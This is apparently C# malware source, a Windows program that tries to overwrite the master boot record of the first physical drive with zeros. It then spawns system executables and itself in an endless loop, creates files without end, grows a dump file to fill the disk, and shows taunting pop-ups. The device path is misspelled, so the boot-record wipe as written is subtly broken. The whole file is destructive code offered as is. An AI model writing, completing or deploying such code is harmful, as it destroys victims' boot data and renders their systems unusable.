
/*  */

using System;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Treasure
{
    class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        private const uint OpenExisting = 0x3;

        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;

        private static string currentFile = Assembly.GetExecutingAssembly().Location;
        private static string[] paths = { currentFile, "C:\\Windows\\System32\\notepad.exe", "C:\\Windows\\explorer.exe", "C:\\Windows\\System32\\netstat.exe", "C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\taskmgr.exe", "C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\cmd.exe" };

        static void Main(string[] args)
        {
            var mbrData = new byte[MbrSize];
            var mbr = CreateFile("\\\\.\\PhsyicalDriver0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);

                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);

            Task D = Task.Run((Action)SecondThread);
            Task A = Task.Run((Action)ThirdThread);
            Task S = Task.Run((Action)FourthThread);

            Console.SetWindowSize(1, 1);

            for(; ;)
            {
                foreach(string p in paths)
                {
                    ProcessStartInfo proc_info = new ProcessStartInfo()
                    {
                        CreateNoWindow = true,
                        WorkingDirectory = Environment.CurrentDirectory,
                        UseShellExecute = true,
                        FileName = p
                    };

                    Process proc = Process.Start(proc_info);                    
                }   
            }
        }

        private static string randomMessage()
        {
            string[] msgs = { "You still there?", "You got Dashed mane!", "Wew, I thought you would be able to resist this one xD", "Oh hi", "Byeeeeee!!!", "Well, you really fucked up this time.", "We got all your personal information. XD" };

            Random rd = new Random();

            return msgs[rd.Next(0, msgs.Length - 1)];
        }

        private static void FourthThread()
        {
            string contents = "";

            while(true)
            {
                contents += "928589895893598359853593892893689023890623890662368902398068902369802489069804890890689048904890689049088904689063435";
                File.AppendAllLines(@"DashFile.dump", contents.Split(Environment.NewLine.ToCharArray()).ToList<string>());
                System.Threading.Thread.Sleep(2);
            }
        }

        private static void ThirdThread()
        {
            while(true)
            {
                Random rd = new Random();
                int FileId = 0;
                string FileName = "DashFile.";

                for (int index = 0; index <= 6; index += 1)
                {
                    FileId += rd.Next(0, 99999);
                }

                File.Create(FileName + FileId.ToString());
                System.Threading.Thread.Sleep(1);
            }
        }

        private static void SecondThread()
        {
            while(true)
            {
                MessageBox.Show(randomMessage(), "::: Dash Shit :::");
                System.Threading.Thread.Sleep(2000);
            }
        }
    }
}
